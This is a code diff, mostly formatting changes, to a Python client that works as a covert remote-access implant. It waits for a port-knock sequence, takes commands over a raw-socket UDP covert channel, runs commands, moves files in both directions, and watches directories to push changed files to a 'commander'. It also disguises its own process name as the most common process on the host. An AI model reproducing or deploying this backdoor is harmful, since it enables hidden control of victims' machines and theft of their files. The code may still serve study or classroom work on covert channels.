@@ -21,23 +21,23 @@ from file_watcher import FileWatcher
 
 # Configuration
 KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
-KNOCK_TIMEOUT  = 10                   # Seconds to complete knock sequence
-COMMAND_PORT   = 8888                 # UDP port for covert channel
-TMP_DIR        = "client_files/"     # Directory for files transferred from commander
+KNOCK_TIMEOUT = 10  # Seconds to complete knock sequence
+COMMAND_PORT = 8888  # UDP port for covert channel
+TMP_DIR = "client_files/"  # Directory for files transferred from commander
 
 
 class CommandType(IntEnum):
     """Commands encoded in UDP src-port field"""
-    DISCONNECT           = 0x1234
-    UNINSTALL            = 0x2345
-    TRANSFER_TO_CLIENT   = 0x3456
+    DISCONNECT = 0x1234
+    UNINSTALL = 0x2345
+    TRANSFER_TO_CLIENT = 0x3456
     TRANSFER_FROM_CLIENT = 0x4567
-    RUN_COMMAND          = 0x5678
-    FILE_WATCH           = 0x6789  # start watching a directory; push changes to commander
-    FILE_DELETE          = 0x7890  # notify commander to delete a file from received_files/
-    STOP_WATCH           = 0x8901  # commander � client: stop the file watcher
-    ACK                  = 0x9ABC
-    ERROR                = 0xABCD
+    RUN_COMMAND = 0x5678
+    FILE_WATCH = 0x6789  # start watching a directory; push changes to commander
+    FILE_DELETE = 0x7890  # notify commander to delete a file from received_files/
+    STOP_WATCH = 0x8901  # commander � client: stop the file watcher
+    ACK = 0x9ABC
+    ERROR = 0xABCD
 
 
 # Command codes the client should accept as inbound instructions.
@@ -61,17 +61,17 @@ class Client:
     """
 
     def __init__(self):
-        self.knock_ports     = KNOCK_SEQUENCE
-        self.command_port    = COMMAND_PORT
-        self.knock_sequence  = KNOCK_SEQUENCE
-        self.knock_timeout   = KNOCK_TIMEOUT
-        self.knock_attempts  = {}
-        self.authorized_ips  = set()
-        self.lock            = threading.Lock()
-        self.running         = True
-        self.protocol        = RawSocketProtocol()
-        self._watcher_thread  = None   # active FileWatcher thread
-        self._watcher_stop    = threading.Event()  # set this to stop the watcher
+        self.knock_ports = KNOCK_SEQUENCE
+        self.command_port = COMMAND_PORT
+        self.knock_sequence = KNOCK_SEQUENCE
+        self.knock_timeout = KNOCK_TIMEOUT
+        self.knock_attempts = {}
+        self.authorized_ips = set()
+        self.lock = threading.Lock()
+        self.running = True
+        self.protocol = RawSocketProtocol()
+        self._watcher_thread = None  # active FileWatcher thread
+        self._watcher_stop = threading.Event()  # set this to stop the watcher
 
     # ------------------------------------------------------------------ #
     #  Port-knock helpers                                                  #
@@ -157,10 +157,10 @@ class Client:
     def _reset_transfer_state(self):
         """Return a clean slate for a new inbound transfer."""
         return {
-            'chunks':        {},
+            'chunks': {},
             'expected_total': None,
             'current_command': None,
-            'current_src_ip':  None,
+            'current_src_ip': None,
         }
 
     def listen_for_covert_commands(self):
@@ -195,9 +195,9 @@ class Client:
                         print(f"[!] Unauthorized covert packet from {src_ip}  ignoring")
                         continue
 
-                    seq          = parsed["seq"]
-                    data         = parsed["data"]
-                    total        = parsed["total"]
+                    seq = parsed["seq"]
+                    data = parsed["data"]
+                    total = parsed["total"]
                     command_code = parsed["command"]
 
                     if state['current_src_ip'] is not None and src_ip != state['current_src_ip']:
@@ -206,10 +206,10 @@ class Client:
                         state = self._reset_transfer_state()
 
                     if state['expected_total'] is None:
-                        state['expected_total']   = total
-                        state['current_command']  = command_code
-                        state['current_src_ip']   = src_ip
-                        state['chunks']           = {}
+                        state['expected_total'] = total
+                        state['current_command'] = command_code
+                        state['current_src_ip'] = src_ip
+                        state['chunks'] = {}
                         print(f"\n[+] Receiving covert command from {src_ip}")
                         print(f"    Expected packets: {total}")
 
@@ -310,8 +310,8 @@ class Client:
             print("[*] Processing TRANSFER_TO_CLIENT")
             try:
                 filename_length = struct.unpack('!H', payload[:2])[0]
-                filename        = payload[2:2 + filename_length].decode('utf-8')
-                filedata        = payload[2 + filename_length:]
+                filename = payload[2:2 + filename_length].decode('utf-8')
+                filedata = payload[2 + filename_length:]
 
                 print(f"    Receiving file: {filename} ({len(filedata)} bytes)")
 
@@ -367,17 +367,17 @@ class Client:
                 # Determine if watching a single file or a directory
                 if os.path.isfile(filepath):
                     target_file = os.path.basename(filepath)
-                    watch_path  = os.path.dirname(filepath)
-                    recursive   = False
+                    watch_path = os.path.dirname(filepath)
+                    recursive = False
                 else:
                     target_file = None
-                    watch_path  = filepath
-                    recursive   = True
+                    watch_path = filepath
+                    recursive = True
 
                 print(f"[DEBUG] target_file={target_file!r} watch_path={watch_path!r} recursive={recursive}")
 
                 ignore_exts = {'.swp', '.swx', '.tmp', '~'}
-                event_mask  = FileWatcher.DEFAULT_MASK
+                event_mask = FileWatcher.DEFAULT_MASK
 
                 def run_watcher():
                     import inotify.adapters
@@ -423,7 +423,7 @@ class Client:
                                     try:
                                         with open(src, 'rb') as f:
                                             filedata = f.read()
-                                        send_name  = target_file or filename
+                                        send_name = target_file or filename
                                         name_bytes = send_name.encode('utf-8')
                                         pkt_payload = struct.pack('!H', len(name_bytes)) + name_bytes + filedata
                                         self.send_response(src_ip, CommandType.FILE_WATCH, pkt_payload)
@@ -501,7 +501,6 @@ class Client:
         except Exception:
             return "127.0.0.1"
 
-
     def start(self):
         print("=" * 60)
         print("Client - Port Knock + Raw Socket Covert Channel")
@@ -526,17 +525,13 @@ class Client:
             print("\n[*] Shutting down client...")
             self.running = False
 
-PR_SET_NAME = 15
 
 def get_process_names():
     names = []
-
     for pid in os.listdir("/proc"):
         if not pid.isdigit():
             continue
-
         comm_path = f"/proc/{pid}/comm"
-
         try:
             with open(comm_path, "r") as f:
                 name = f.read().strip()
@@ -544,25 +539,23 @@ def get_process_names():
         except:
             # process might have exited or permission denied
             pass
-
     return names
 
 
 def most_common_process():
     names = get_process_names()
-
     if not names:
         return None
-
     counter = Counter(names)
     name, count = counter.most_common(1)[0]
-
     print(f"Most common process: {name} ({count} instances)")
     return name
 
+
 def rename_process(new_name):
     libc = ctypes.CDLL("libc.so.6")
-    libc.prctl(PR_SET_NAME, new_name.encode(), 0, 0, 0)
+    libc.prctl(15, new_name.encode(), 0, 0, 0)
+
 
 def main():
     print("Client Program")
